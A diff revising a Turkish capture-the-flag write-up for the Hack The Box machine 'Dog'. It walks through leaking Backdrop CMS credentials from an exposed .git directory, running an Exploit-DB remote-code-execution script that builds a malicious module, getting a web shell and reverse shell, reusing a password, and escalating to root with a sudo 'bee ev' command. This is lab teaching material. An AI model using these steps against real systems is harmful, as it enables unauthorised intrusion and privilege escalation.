@@ -11,7 +11,7 @@ image:
 
 ## Özet
 
-Dog, Backdrop CMS adında bir içerik yönetim sistemi kullanan kolay seviye linux bir makinedir. Nmap taraması sonucunda .git/ dizinini keşfedecek ve repoyu indireceğiz. Bu repo üzerinden içerik yönetim sistemindeki kullanıcılardan birinin parolasını ve kullanıcı adını öğreneceğiz. Daha sonra ise içerik yönetim sistemi üzerinden sisteme shell dosyamızı yükleyecek ve bir reverse shell bağlantısı alacağız. Sistemdeki kullanıcılardan birinin aynı parolayı kullanması nedeniyle o kullanıcıya geçiş yapacağız. Daha sonra ise root haklarıyla bir dosyayı çalıştırabileceğimizi fark edecek ve o dosya üzerinden yetki yükselteceğiz.
+Dog, Backdrop CMS adında bir içerik yönetim sistemi kullanan kolay seviye bir linux makinedir. Nmap taraması sonucunda .git/ dizinini keşfedecek ve repoyu indireceğiz. Bu repo üzerinden içerik yönetim sistemindeki kullanıcılardan birinin parolasını ve kullanıcı adını öğreneceğiz. Daha sonra ise içerik yönetim sistemi üzerinden sisteme shell dosyamızı yükleyecek ve bir reverse shell bağlantısı alacağız. Sistemdeki kullanıcılardan birinin aynı parolayı kullanması nedeniyle o kullanıcıya geçiş yapacağız. Daha sonra ise root haklarıyla bir dosyayı çalıştırabileceğimizi fark edecek ve o dosya üzerinden yetki yükselteceğiz.
 
 ## Keşif aşaması
 
@@ -69,7 +69,7 @@ $database = 'mysql://root:[GİZLi]@127.0.0.1/backdrop';
 $database_prefix = '';
 ```
 
-Web uygulamasında `root` isminde bir kullanıcı bulunmadığından giriş yapamadım. Web uygulamasında bir kaç gönderi paylaşıldığını görmüştüm, dolayısıyla gönderileri paylaşan kullanıcıların isimlerini de denedim ama nafile. Hakkında sayfasındaki `support@doh.htb` mailinden yola çıkarak `Git` reposunda kullanıcı isimleri olup olmadığını kontrol ettim ve bir kullanıcı adı buldum.
+Web uygulamasında `root` isminde bir kullanıcı bulunmadığından giriş yapamadım. Sitede bir kaç gönderi paylaşıldığını görmüştüm, dolayısıyla gönderileri paylaşan kullanıcıların adlarını da denedim ama nafile. Hakkında sayfasındaki `support@dog.htb` mailinden yola çıkarak `Git` reposu üzerinden kullanıcı adları bulmaya çalıştığımızda iki adet mail adresi görüyoruz. Bu maillerden biri aradığımız kullanıcının ta kendisidir.
 
 ```console
 $grep -r "@dog.htb"
@@ -79,16 +79,20 @@ files/config_83dddd18e1ec67fd8ff5bba2453c7fb3/active/update.settings.json:      
 
 ## Sömürü aşaması
 
-### Modüller üzerinden php shell yüklenmesi
+![](4.webp){: width="1200" height="600" }
 
-Elde ettiğimiz kullanıcı bilgileri ile sisteme giriş yapalım. Daha sonra `reverse shell` kodlarımızı yükleyebilmek için sayfaları kontrol edelim. Temaların bulunduğu kısımda sadece içerikleri düzenleyebileceğimiz bir sayfa var. Modüller sayfasında ise keyfimize göre modül ekleyemiyoruz. Bu hazır içerik yönetim sistemine nasıl php shell yükleyebileceğimi öğrenmek için internette arama yaptım ve [bu](https://www.exploit-db.com/raw/52021) sayfa ile karşılaştım. Programı çalıştırdıktan sonra bize bir `.zip` dosyası veriyor ve verdiği dizin üzerinden siteye yüklememizi istiyor.
+Elde ettiğimiz kullanıcı bilgileri ile sisteme giriş yapalım. Daha sonra `reverse shell` kodlarımızı yükleyebilmek için sayfaları kontrol edelim. Temaların bulunduğu kısımda sadece içerikleri düzenleyebileceğimiz bir sayfa var. Modüller sayfasına ise keyfimize göre modül yükleyemiyoruz.
+
+### Zararlı modülün oluşturulması ve yüklenmesi
+
+Bu hazır içerik yönetim sistemine nasıl php shell yükleyebileceğimi öğrenmek için internette arama yaptım ve [bu](https://www.exploit-db.com/raw/52021) sayfa ile karşılaştım. Programı çalıştırdıktan sonra bize bir `.zip` dosyası veriyor ve dosyayı verdiği dizin üzerinden siteye yüklememizi istiyor.
 
 ```console
-$ python3 52021 http://10.10.11.58                                                                                                                                                        
-Backdrop CMS 1.27.1 - Remote Command Execution Exploit                                                                                                                                        
-Evil module generating...                                                                                                                                                                     
-Evil module generated! shell.zip                                                                                                                                                              
-Go to http://10.10.11.58/admin/modules/install and upload the shell.zip for Manual Installation.                                                                                              
+$ python3 52021 http://10.10.11.58
+Backdrop CMS 1.27.1 - Remote Command Execution Exploit
+Evil module generating...
+Evil module generated! shell.zip
+Go to http://10.10.11.58/admin/modules/install and upload the shell.zip for Manual Installation.
 Your shell address: http://10.10.11.58/modules/shell/shell.php
 ```
 
@@ -96,7 +100,7 @@ Oluşturduğu `.zip` dosyasını `.tar.gz` formatına çevirdikten sonra bahsett
 
 ![](2.webp){: width="900" height="500" }
 
-Dosya yüklendikten sonra programda belirtilen adrese gidiyor ve buradaki web shell üzerinden ncat ile bir bağlantı elde ediyoruz.
+Dosya yüklendikten sonra programda belirtilen adrese gidiyor ve buradaki web shell üzerinden ncat ile bir bağlantı alıyoruz.
 
 ![](3.webp){: width="900" height="500" }
 
@@ -104,7 +108,7 @@ Dosya yüklendikten sonra programda belirtilen adrese gidiyor ve buradaki web sh
 
 ### johncusack
 
-Sisteme girdikten sonra bayrağı alabilmek için /home dizine yöneldim. Burada iki kullanıcı dizini bulunuyor. `jobert` dizininin içerisinde herhangi bir bilgi yok. `johncusack` kullanıcısının dizinini ise görüntüleyemiyoruz. Elimizdeki tek parolayı denediğimizde ise başarıyla kullanıcıya geçiş yapabiliyoruz.
+Sisteme girdikten sonra bayrağı alabilmek için /home dizine yöneldim. Burada iki kullanıcı dizini bulunuyor. `jobert` dizininin içerisinde herhangi bir bilgi yok. `johncusack` kullanıcısının dizinini ise görüntüleyemiyoruz. Ancak `johncusack` kullanıcısının parolası web siteye girmek için kullandığımız parola ile eşleşiyor.
 
 ```console
 www-data@dog:/home$ su johncusack
@@ -114,7 +118,7 @@ johncusack@dog:/home$
 
 ### root
 
-Sudo yetkilerimizi kontrol ettiğimizde `bee` isimli bir dosyayı root kullanıcısı adına çalıştırabileceğimizi görüyoruz.
+Sudo yetkilerimizi kontrol ettiğimizde `bee` isimli bir dosyayı herhangi bir kullanıcı adına çalıştırabileceğimizi görüyoruz.
 
 ```console
 johncusack@dog:~$ ls
@@ -128,7 +132,7 @@ User johncusack may run the following commands on dog:
     (ALL : ALL) /usr/local/bin/bee
 ```
 
-Bu dosyayı çalıştırdıktan sonra kullanılabilir parametreler ile karşılaşıyoruz. Görünüşe göre `ev` veya `php-eval` parametresini kullanarak kod çalıştırabiliyoruz.
+Dosyayı çalıştırdığımızda kullanılabilir tüm parametreler görüntüleniyor. Tabi ihtiyacımız olan şey, root kullanıcısı adına komut çalıştırmak olduğundan ilk olarak gözümüze `eval` parametresi takılıyor.
 
 ```console
 johncusack@dog:~$ sudo /usr/local/bin/bee
@@ -147,7 +151,7 @@ johncusack@dog:~$ sudo /usr/local/bin/bee ev "system('/bin/bash');"
  ✘  The required bootstrap level for 'eval' is not ready.
 ```
 
-Dosyayı biraz inceledikten sorna Backdrop CMS'i yönetmek için kullanılan bir dosya olduğunu fark ettim. Diğer komutlarıda çalıştırdıktan sonra `Backdrop` içerik dosyasının adresini bulamadığını fark ettim.
+Dosyayı biraz inceledikten sorna Backdrop CMS'i yönetmek için kullanılan bir dosya olduğunu öğrendim. Diğer komutlarıda kullandıktan sonra da `Backdrop` içerik yönetim sisteminin adresini bulamadığını fark ettim.
 
 ```console
 johncusack@dog:~$ sudo /usr/local/bin/bee sqlc
@@ -159,7 +163,7 @@ Stack trace:
   thrown in /backdrop_tool/bee/commands/db.bee.inc on line 279
 ```
 
-Komutları tekrar gözden geçirdikten sonra `--root` parametresi ile CMS'in adresini gösterebileceğimi gördüm. Daha sonra ise komutu çalıştırdım ve root kullanıcısının haklarına sahip oldum.
+Komutları tekrar gözden geçirdikten sonra `--root` parametresi ile CMS'in adresini belirtebileceğimizi görüyoruz. Daha sonra ise komutu parametreyi komuta dahil ediyor ve çalıştırıyoruz.
 
 ```console
 johncusack@dog:~$ sudo /usr/local/bin/bee ev "system('/bin/bash');" --root=/var/www/html/
